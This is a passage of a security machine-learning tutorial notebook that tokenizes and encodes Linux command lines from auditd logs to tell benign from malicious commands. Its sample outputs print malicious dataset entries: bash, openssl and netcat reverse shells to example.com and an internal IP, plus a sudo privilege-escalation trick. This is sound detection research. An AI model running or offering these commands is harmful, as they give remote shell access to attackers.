+<p>We encounter numerous log collection hubs that lack enough analytics to infer necessary visibility out of acquired data. Often, TB of logs are collected to perform only a basic analytics, and considered to be used in an <em>ad hoc</em>, reactive manner - if investiagtion is needed. Example of valuable data without enough processing attention - auditd’s <code class="docutils literal notranslate"><span class="pre">execve</span></code> syscall containing shell commandlines:</p>
+<a class="reference internal image-reference" href="2022/img/auditd_elastic_screen.png"><img alt="2022/img/auditd_elastic_screen.png" src="2022/img/auditd_elastic_screen.png" style="width: 750px;" /></a>
+<p>In this practice we will <strong>not</strong>:</p>
+<ul class="simple">
+<li><p>Discuss telemetry infrastructure setup - so we do not cover e.g. <code class="docutils literal notranslate"><span class="pre">auditd</span></code> configuration. If you want a good starting point, use <a class="reference external" href="https://github.com/Neo23x0/auditd">this config</a>.</p></li>
+<li><p>Cover how to fetch this data to your analytical host - we do not cover specific tool API samples. We encountered such data stored in Elastic, Splunk, Spark clusters, and based on our observations data queries do not represent a challenge for practitioners.</p></li>
+</ul>
+<p>In this Notebook we will:</p>
+<ul class="simple">
+<li><p>Work with sample Linux command datasets consisting from benign and malicious entries</p></li>
+<li><p>Use <code class="docutils literal notranslate"><span class="pre">slp</span></code> (Shell Language Processing) and <code class="docutils literal notranslate"><span class="pre">scikit-learn</span></code> libraries to encode commands as a vectors</p></li>
+<li><p>Use <code class="docutils literal notranslate"><span class="pre">scikit-learn</span></code> and <code class="docutils literal notranslate"><span class="pre">xgboost</span></code> libraries to create a Machine Learning models</p>
+<ul>
+<li><p>Train a supervised classifier</p></li>
+<li><p>Perform an anomaly detection</p></li>
+</ul>
+</li>
+<li><p>Figure out what works and don’t work in security applied machine learning</p></li>
+</ul>
+<p>This material is prepared to be processed by audience without a specific background, but beneficial would be:</p>
+<ul class="simple">
+<li><p>familiarity with conventional security and administration concepts, e.g. Linux environment, auditd telemetry</p></li>
+<li><p>Python fundamentals</p></li>
+</ul>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="loading-data">
+<h1>Loading data<a class="headerlink" href="#loading-data" title="Permalink to this headline">#</a></h1>
+<p>Let’s load sample data used for this demo and take a look on it:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># NumPy: &quot;The fundamental package for scientific computing with Python&quot;</span>
+<span class="c1"># allows to work with vectors, matrices, etc., aka Linear Algebra</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+
+<span class="c1"># packages needed to fetch data</span>
+<span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="c1"># matplotlib and seaborn are famous libraries for graph plotting in Python</span>
+<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
+<span class="kn">import</span> <span class="nn">seaborn</span> <span class="k">as</span> <span class="nn">sns</span>
+<span class="n">sns</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+
+<span class="c1"># specifying a static random seed for reproducibility purposes</span>
+<span class="n">RANDOM_SEED</span> <span class="o">=</span> <span class="mi">1337</span>
+
+<span class="c1"># benign command data samples</span>
+<span class="n">benign</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/dtrizna/slp/main/data/nl2bash.cm&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)]</span>
+<span class="n">auditd_execve_sample</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/dtrizna/slp/main/data/exeve_sample.log&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># malicious command dataset</span>
+<span class="n">zraw</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://github.com/dtrizna/slp/raw/main/data/malicious.zip&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+<span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">zraw</span><span class="p">))</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
+    <span class="k">with</span> <span class="n">z</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;malicious.cm&quot;</span><span class="p">,</span> <span class="n">pwd</span><span class="o">=</span><span class="s2">&quot;infected&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="k">as</span> <span class="n">f2</span><span class="p">:</span>
+        <span class="n">malicious</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f2</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
+</pre></div>
+</div>
+</div>
+</div>
+<p>Just 5 benign commands for example:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">benign</span><span class="p">[</span><span class="o">-</span><span class="mi">55</span><span class="p">:</span><span class="o">-</span><span class="mi">50</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&quot;sed &#39;s/3d3d/\\n&amp;/2g&#39; temp | split -dl1 - temp&quot;,
+ &#39;tar [your params] |split -b 500m - output_prefix&#39;,
+ &#39;split --lines=50000 /path/to/large/file /path/to/output/file/prefix&#39;,
+ &#39;split -n2 infile&#39;,
+ &#39;split -l 50000000 --filter=./filter.sh 2011.psv&#39;]
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">len</span><span class="p">(</span><span class="n">benign</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>12607
+</pre></div>
+</div>
+</div>
+</div>
+<p>… again just 5 commands, but known to be used for malicious purposes:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">malicious</span><span class="p">[</span><span class="o">-</span><span class="mi">55</span><span class="p">:</span><span class="o">-</span><span class="mi">50</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;bash -i &gt;&amp; /dev/tcp/example.com/4242 0&gt;&amp;1&#39;,
+ &#39;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/example.com/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#39;,
+ &#39;python -c \&#39;import os; os.system(&quot;/bin/sh&quot;)\&#39;&#39;,
+ &#39;sudo -u#-1 /bin/bash&#39;,
+ &#39;mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe&#39;]
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">len</span><span class="p">(</span><span class="n">malicious</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>123
+</pre></div>
+</div>
+</div>
+</div>
+<p>According to our needs, we can continue with additional analysis of data, just for example - investigation of commandline lengths in the dataset:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">hist</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">benign</span> <span class="o">+</span> <span class="n">malicious</span><span class="p">],</span> <span class="n">bins</span><span class="o">=</span><span class="mi">40</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">yscale</span><span class="p">(</span><span class="s2">&quot;log&quot;</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">xlabel</span><span class="p">(</span><span class="s2">&quot;Length of command&quot;</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">ylabel</span><span class="p">(</span><span class="s2">&quot;Count of commands (log)&quot;</span><span class="p">)</span>
+<span class="n">_</span> <span class="o">=</span> <span class="n">plt</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s2">&quot;Distribution of command lengths across the dataset&quot;</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<img alt="../../_images/day2-08-Shell-Language-Processing_9_0.png" src="../../_images/day2-08-Shell-Language-Processing_9_0.png" />
+</div>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="data-preprocessing-for-machine-learning-ml-model">
+<h1>Data preprocessing for Machine Learning (ML) model<a class="headerlink" href="#data-preprocessing-for-machine-learning-ml-model" title="Permalink to this headline">#</a></h1>
+<p>In machine learning scientific community it is assumed to use <span class="math notranslate nohighlight">\(X\)</span> as a notation for input data. When supervised algorithms are used, we need to specify label of data denoted by <span class="math notranslate nohighlight">\(y\)</span> to train model. In this case we assign label <span class="math notranslate nohighlight">\(0\)</span> to benign entries, and label <span class="math notranslate nohighlight">\(1\)</span> to represent maliciousness:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># joining datasets together and assigning labels</span>
+<span class="n">X</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">benign</span> <span class="o">+</span> <span class="n">malicious</span>
+<span class="n">y</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">benign</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">malicious</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<p>When speaking about introducing ML stuff – in the industry, tutorials, courses – huge emphasis is made on ML models itself.</p>
+<p>For our point of view, however, data <strong>preprocessing</strong> step posses the highest psychological gap for practitioners (engineers, analysts) trying to weaponize their data. Machine Learning models expect encoded data – numerical vectors – as input for their functionality.</p>
+<p>High level example of classical Natural Language Processing (NLP) pipeline might look like:</p>
+<a class="reference internal image-reference" href="2022/img/nlp_pipeline.png"><img alt="2022/img/nlp_pipeline.png" src="2022/img/nlp_pipeline.png" style="width: 700px;" /></a>
+<p>Arguably, shell commandlines do not need a <em>cleaning</em> out of punctuation like many NLP applications, since shell syntax embeds large portion of epistemic knowledge within punctuation. However, you still might need to perform a different type of cleaning based on telemetry you receive, e.g. <em>normalization of domain names, IP addresses, usernames</em>.</p>
+<p>Crucial steps for processing textual data as a feature vectors are <strong>Tokenization</strong> and <strong>Encoding</strong>, which we discuss in detail below.</p>
+<p>Worth mentioning that over the years classical NLP applications developed many other techniques which are less relevant for shell telemetry and we ommit them for the purpose of this exercise.</p>
+<div class="section" id="tokenization">
+<h2>Tokenization<a class="headerlink" href="#tokenization" title="Permalink to this headline">#</a></h2>
+<p>Pre-processing and encoding of data is highly dependant on field and specific data source. Tokenization represents an idea of <em>dividing any continuous sequence to an elemental parts</em> called tokens. Tokenization applied on shell syntax is significantly harder from what we see in natural languages and posses several challenges:</p>
+<ul class="simple">
+<li><p>spaces are not always elemental separators</p></li>
+<li><p>dots and commas have a dedicated meaning</p></li>
+<li><p>specific values behind different punctuation symbols like dash, pipe, semicolon, etc.</p></li>
+</ul>
+<a class="reference internal image-reference" href="2022/img/commmand_tokenization_ambiguity.png"><img alt="2022/img/commmand_tokenization_ambiguity.png" src="2022/img/commmand_tokenization_ambiguity.png" style="width: 700px;" /></a>
+<p>There are two ways to approach this problem:</p>
+<ol class="simple">
+<li><p>use built-in <code class="docutils literal notranslate"><span class="pre">argc</span></code> segregation in <code class="docutils literal notranslate"><span class="pre">auditd</span></code> <code class="docutils literal notranslate"><span class="pre">EXECVE</span></code> syscall logging</p></li>
+<li><p>utilize custom tokenizer to do a data parsing involving a domain knowledge</p></li>
+</ol>
+<div class="section" id="utilization-of-argc-and-ax-values-in-auditd-logging">
+<h3>1. Utilization of <code class="docutils literal notranslate"><span class="pre">argc</span></code> and <code class="docutils literal notranslate"><span class="pre">aX</span></code> values in <code class="docutils literal notranslate"><span class="pre">auditd</span></code> logging<a class="headerlink" href="#utilization-of-argc-and-ax-values-in-auditd-logging" title="Permalink to this headline">#</a></h3>
+<p>Below is a sample of <code class="docutils literal notranslate"><span class="pre">auditd</span></code> telemetry, specifically <code class="docutils literal notranslate"><span class="pre">execve</span></code> call, representing an executed commands on the target machine:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">auditd_execve_sample</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">:]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;type=EXECVE msg=audit(1648482003.144:915): argc=2 a0=&quot;cat&quot; a1=&quot;audit.log&quot;\r&#39;,
+ &#39;type=EXECVE msg=audit(1648482003.144:916): argc=3 a0=&quot;grep&quot; a1=&quot;--color=auto&quot; a2=&quot;argc&quot;\r&#39;,
+ &#39;type=EXECVE msg=audit(1648482003.144:918): argc=2 a0=&quot;wc&quot; a1=&quot;-l&quot;\r&#39;,
+ &#39;type=EXECVE msg=audit(1648482012.228:937): argc=2 a0=&quot;cat&quot; a1=&quot;audit.log&quot;\r&#39;,
+ &#39;type=EXECVE msg=audit(1648482012.228:939): argc=3 a0=&quot;grep&quot; a1=&quot;--color=auto&quot; a2=&quot;argc&quot;&#39;]
+</pre></div>
+</div>
+</div>
+</div>
+<p>Let’s implement a function that acquire a sequence of tokens based on <code class="docutils literal notranslate"><span class="pre">execve</span></code> log message?</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">parse_auditd</span><span class="p">(</span><span class="n">execve_log</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">arguments</span> <span class="o">=</span> <span class="n">execve_log</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;argc=&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+        <span class="n">argc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">arguments</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="n">cmd_tokens</span> <span class="o">=</span> <span class="p">[</span><span class="n">arguments</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">argc</span><span class="p">)]</span>
+        <span class="k">return</span> <span class="n">cmd_tokens</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">[]</span>
+    
+<span class="n">execve_tokens</span> <span class="o">=</span> <span class="p">[</span><span class="n">parse_auditd</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">auditd_execve_sample</span><span class="p">]</span>
+<span class="n">execve_tokens</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">:]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[[&#39;cat&#39;, &#39;audit.log&#39;],
+ [&#39;grep&#39;, &#39;--color&#39;, &#39;argc&#39;],
+ [&#39;wc&#39;, &#39;-l&#39;],
+ [&#39;cat&#39;, &#39;audit.log&#39;],
+ [&#39;grep&#39;, &#39;--color&#39;, &#39;argc&#39;]]
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="dedicated-tokenizer-for-commands">
+<h3>2. Dedicated Tokenizer for commands<a class="headerlink" href="#dedicated-tokenizer-for-commands" title="Permalink to this headline">#</a></h3>
+<p>However, in cases when we have commands as a continuous strings or we are not happy with <code class="docutils literal notranslate"><span class="pre">auditd</span></code> built-in partitioning, we need a different approach. We suggest using our own Tokenizer. Consider data in a format we received our data sets:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">malicious</span><span class="p">[</span><span class="o">-</span><span class="mi">55</span><span class="p">:</span><span class="o">-</span><span class="mi">50</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;bash -i &gt;&amp; /dev/tcp/example.com/4242 0&gt;&amp;1&#39;,
+ &#39;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/example.com/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#39;,
+ &#39;python -c \&#39;import os; os.system(&quot;/bin/sh&quot;)\&#39;&#39;,
+ &#39;sudo -u#-1 /bin/bash&#39;,
+ &#39;mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe&#39;]
+</pre></div>
+</div>
+</div>
+</div>
+<p>We can use <code class="docutils literal notranslate"><span class="pre">ShellTokenizer</span></code> class implemented as part of our Shell Language Processing tooklit:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;slp.py&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/dtrizna/slp/main/slp.py&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+  <span class="kn">import</span> <span class="nn">google.colab</span>
+  <span class="n">IN_COLAB</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="k">except</span><span class="p">:</span>
+  <span class="n">IN_COLAB</span> <span class="o">=</span> <span class="kc">False</span>
+
+<span class="k">if</span> <span class="n">IN_COLAB</span><span class="p">:</span>
+    <span class="o">!</span>pip install bashlex
+<span class="k">else</span><span class="p">:</span>
+  <span class="n">code</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;python3 -m pip install bashlex&quot;</span><span class="p">)</span>
+  <span class="k">if</span> <span class="n">code</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;python -m pip install bashlex&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">slp</span> <span class="kn">import</span> <span class="n">ShellTokenizer</span>
+
+<span class="n">t</span> <span class="o">=</span> <span class="n">ShellTokenizer</span><span class="p">(</span><span class="n">verbose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;tokenized&quot;</span><span class="p">],</span> <span class="n">X</span><span class="p">[</span><span class="s2">&quot;counter&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">tokenize</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">])</span> <span class="c1"># takes ~30 s</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[*] Parsing in process: 12730/12730
+</pre></div>
+</div>
+</div>
+</div>
+<p>This allows to achieve results in just 2 lines of code, and results preserve punctuation relevant for decision heuristics based on this data.
+For example, <code class="docutils literal notranslate"><span class="pre">openssl</span></code> that opens an encrypted network channel is a generally used legitimate command, however, given pipe of any shell interpreter obviously states malicious usage:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;tokenized&quot;</span><span class="p">]))</span>
+<span class="nb">print</span><span class="p">([</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">X</span><span class="p">[</span><span class="s2">&quot;tokenized&quot;</span><span class="p">]</span> <span class="k">if</span> <span class="s2">&quot;openssl&quot;</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s2">&quot;-connect&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>12730
+[&#39;mkfifo&#39;, &#39;/tmp/s&#39;, &#39;;&#39;, &#39;/bin/sh&#39;, &#39;-i&#39;, &#39;&lt;&#39;, &#39;&gt;&amp;&#39;, &#39;|&#39;, &#39;openssl&#39;, &#39;s_client&#39;, &#39;-quiet&#39;, &#39;-connect&#39;, &#39;example.com:4242&#39;, &#39;&gt;&#39;, &#39;;&#39;, &#39;rm&#39;, &#39;/tmp/s&#39;]
+</pre></div>
+</div>
+</div>
+</div>
+<p>We have proven that using a dedicated tokenizer for Shell commmandlines noticeably increase performance of Machine Learning pipelines. For more details, refer to our paper: <a class="reference external" href="https://arxiv.org/abs/2107.02438">arxiv.org/abs/2107.02438</a></p>
+</div>
+</div>
+<div class="section" id="encoding">
+<h2>Encoding<a class="headerlink" href="#encoding" title="Permalink to this headline">#</a></h2>
+<p>Once we received a tokenized sequence of commands, we can proceed to represention of these sequences in a some way. There are multiple conventional ways to represent sequence of textual tokens as a numeric array, we will consider:</p>
+<ul class="simple">
+<li><p>One-Hot</p></li>
+<li><p>Bag-of-Words</p></li>
+<li><p>Hashing trick Vectorizer</p></li>
+<li><p>TF-IDF (Term frequency-inverse document frequency)</p></li>
+</ul>
+<p>A short TL;DR on aforementioned type intuitions. Consider following dataset:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">1.</span> <span class="n">I</span> <span class="n">love</span> <span class="n">dogs</span><span class="o">.</span>
+<span class="mf">2.</span> <span class="n">I</span> <span class="n">hate</span> <span class="n">dogs</span> <span class="ow">and</span> <span class="n">knitting</span><span class="o">.</span>
+<span class="mf">3.</span> <span class="n">Knitting</span> <span class="ow">is</span> <span class="n">my</span> <span class="n">hobby</span> <span class="ow">and</span> <span class="n">my</span> <span class="n">passion</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>Then <a class="reference external" href="https://scikit-learn.org/stable/modules/generated/sklearn.preprocessing.OneHotEncoder.html"><strong>One-Hot</strong></a> encoding looks like this:</p>
+<a class="reference internal image-reference" href="2022/img/enc_onehot.png"><img alt="2022/img/enc_onehot.png" src="2022/img/enc_onehot.png" style="width: 500px;" /></a>
+<p>Then <a class="reference external" href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.CountVectorizer.html"><strong>Bag-of-Words</strong></a> (BoW) (a.k.a. <strong>Term-Frequency (TF)</strong>) encoding looks like this:</p>
+<a class="reference internal image-reference" href="2022/img/enc_bow.png"><img alt="2022/img/enc_bow.png" src="2022/img/enc_bow.png" style="width: 500px;" /></a>
+<p>The <a class="reference external" href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.HashingVectorizer.html"><strong>HashingVectorizer</strong></a> allows to map dictionary of tokens to a map of hashed tokens, that drastically reduce memory demands and can produce other benefits for security related implementations <a class="reference external" href="https://secret.inf.ufpr.br/2021/09/29/adversarial-machine-learning-malware-detection-and-the-2021s-mlsec-competition/">[Ceschin and Botacin, (2021)]</a>.</p>
+<p><a class="reference external" href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html"><strong>TF-IDF</strong></a> is more sophisticated version of BoW, where appearance of word in other documents is taken into considerations:</p>
+<div class="math notranslate nohighlight">
+\[ \texttt{TF-IDF} = \dfrac{\texttt{TF (a.k.a. Nr. of words)}}{\texttt{Nr. of documents containing this word}}\]</div>
+<p>In our sample dataset this would result in:</p>
+<a class="reference internal image-reference" href="2022/img/enc_tfidf.png"><img alt="2022/img/enc_tfidf.png" src="2022/img/enc_tfidf.png" style="width: 500px;" /></a>
+<p>TF-IDF on the contrary to One-Hot and BoW allows to emphasize tokens representative for current document and de-emphasize common tokens.</p>
+<div class="section" id="sklearn-library-with-custom-tokenizer">
+<h3><strong>sklearn</strong> library with custom tokenizer:<a class="headerlink" href="#sklearn-library-with-custom-tokenizer" title="Permalink to this headline">#</a></h3>
+<p><strong>TfIdfVectorizer</strong> example:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sklearn.feature_extraction.text</span> <span class="kn">import</span> <span class="n">TfidfVectorizer</span><span class="p">,</span> <span class="n">HashingVectorizer</span>
+<span class="kn">from</span> <span class="nn">nltk.tokenize</span> <span class="kn">import</span> <span class="n">wordpunct_tokenize</span>
+
+<span class="n">TOP_TOKENS</span> <span class="o">=</span> <span class="mi">100</span>
+
+<span class="n">tfidf_enc</span> <span class="o">=</span> <span class="n">TfidfVectorizer</span><span class="p">(</span>
+    <span class="n">lowercase</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+    <span class="n">tokenizer</span><span class="o">=</span><span class="n">wordpunct_tokenize</span><span class="p">,</span>
+    <span class="n">token_pattern</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
+    <span class="n">max_features</span><span class="o">=</span><span class="n">TOP_TOKENS</span>
+<span class="p">)</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">tfidf_enc</span><span class="o">.</span><span class="n">fit_transform</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">])</span>
+
+<span class="c1"># print out first 15 tokens TF-IDF utilizes</span>
+<span class="n">tfidf_enc</span><span class="o">.</span><span class="n">get_feature_names_out</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>array([&#39;!&#39;, &#39;&quot;&#39;, &#39;&quot;$&#39;, &#39;&quot;*.&#39;, &#39;$&#39;, &#39;$(&#39;, &#39;%&#39;, &quot;&#39;&quot;, &quot;&#39;*.&quot;, &quot;&#39;{&quot;, &quot;&#39;{}&#39;&quot;,
+       &#39;)&#39;, &#39;*&#39;, &#39;*.&#39;, &#39;+&#39;], dtype=object)
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
